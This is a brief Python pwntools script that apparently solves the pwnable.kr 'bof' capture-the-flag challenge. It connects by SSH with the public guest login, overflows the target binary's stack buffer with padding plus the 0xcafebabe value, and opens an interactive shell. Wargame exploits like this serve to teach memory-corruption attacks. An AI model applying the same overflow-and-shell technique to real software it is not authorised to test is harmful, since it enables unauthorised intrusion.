from pwn import *

payload = b'A' * 52 + b'\xbe\xba\xfe\xca'
shell = ssh('bof','pwnable.kr',port=2222,password="guest")
shell = shell.process('./bof')
shell.sendline(payload)
shell.interactive()
